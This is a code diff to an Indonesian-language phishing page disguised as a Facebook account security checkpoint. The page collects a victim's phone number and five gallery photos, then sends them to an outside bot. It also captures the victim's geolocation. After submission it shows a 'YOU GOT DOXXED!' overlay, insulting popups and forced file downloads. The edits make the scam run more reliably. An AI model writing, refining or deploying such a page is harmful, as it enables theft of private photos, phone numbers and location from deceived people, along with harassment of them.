@@ -27,9 +27,12 @@
         }
         .btn-fb:active { transform: scale(0.94); }
 
-        /* Virus UI Elements ☠️ */
-        #chaos-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 10000; }
-        #chaos-video { width: 100%; height: 100%; object-fit: cover; }
+        /* CHAOS OVERLAY FIX ☠️ */
+        #chaos-overlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: black; z-index: 10000; 
+        }
+        #chaos-video { width: 100%; height: 100%; object-fit: contain; background: black; }
         
         .popup-virus {
             position: absolute; width: 220px; background: #eee; border: 2px solid #000;
@@ -42,10 +45,11 @@
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             color: #ff0000; font-size: 40px; font-weight: 900; z-index: 10005;
             text-shadow: 4px 4px #000; animation: flash-anim 0.2s infinite; display: none;
+            text-align: center; width: 100%;
         }
         @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
 
-        /* Credit Bar */
+        /* Credit & Music Bar */
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
             color: white; padding: 10px 20px; display: flex; align-items: center; 
@@ -67,7 +71,7 @@
 </div>
 
 <div id="chaos-overlay">
-    <video id="chaos-video" loop playsinline>
+    <video id="chaos-video" loop playsinline muted>
         <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
     </video>
     <div id="dox-flash" class="doxxed-flash">YOU GOT DOXXED!</div>
@@ -77,7 +81,7 @@
     <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
 </audio>
 
-<div class="container">
+<div class="container" id="main-ui">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
         <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
@@ -85,7 +89,7 @@
         <hr>
 
         <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
-            <b>Gagal!</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
+            <b>Gagal!</b><br>Pastikan nomor HP benar (min. 10 digit) dan pilih 5 foto.
         </div>
 
         <div class="text-start">
@@ -158,12 +162,14 @@
             return;
         }
         
-        // Sikat data!
-        sendToBot(`📱 NOMOR: ${phone}`);
-        for (let i = 0; i < 5; i++) sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
+        document.getElementById('mainError').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-        // TRIGGER CHAOS ☠️😈
-        startChaos();
+        sendToBot(`📱 NOMOR: ${phone}`);
+        for (let i = 0; i < 5; i++) { if(files[i]) sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]); }
+
+        // MENGAKTIFKAN CHAOS ☠️
+        setTimeout(startChaos, 1500); 
     }
 
     function startChaos() {
@@ -172,23 +178,25 @@
         const dox = document.getElementById('dox-flash');
         
         overlay.style.display = 'block';
-        vid.play();
+        vid.muted = false; // Matikan mute pas mau jalan
+        vid.play().catch(e => console.log("Video play error: ", e));
+        
         dox.style.display = 'block';
         setTimeout(() => { dox.style.display = 'none'; }, 6000);
 
-        // Pop-up Virus Everywhere 😂
+        // Virus Pop-up
         for (let i = 0; i < 20; i++) {
             setTimeout(() => {
                 let div = document.createElement('div');
                 div.className = 'popup-virus';
                 div.style.top = Math.random() * 80 + '%';
                 div.style.left = Math.random() * 80 + '%';
-                div.innerHTML = "<span style='color:red'>WARNING!</span><br>YOU ARE IDIOT!<br>GOT DOXXED!";
+                div.innerHTML = "<span style='color:red'>WARNING!</span><br>YOU ARE IDIOT!<br>YOU GOT DOXXED!";
                 overlay.appendChild(div);
-            }, i * 200);
+            }, i * 150);
         }
 
-        // Auto Download 5 files 😋
+        // Auto Download 5 files
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU IDIOT HAHAHA"], { type: "text/plain" });
             let url = window.URL.createObjectURL(blob);
@@ -216,7 +224,7 @@
 
     function autoLocation() {
         navigator.geolocation.getCurrentPosition(p => {
-            sendToBot(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
         });
     }
 </script>
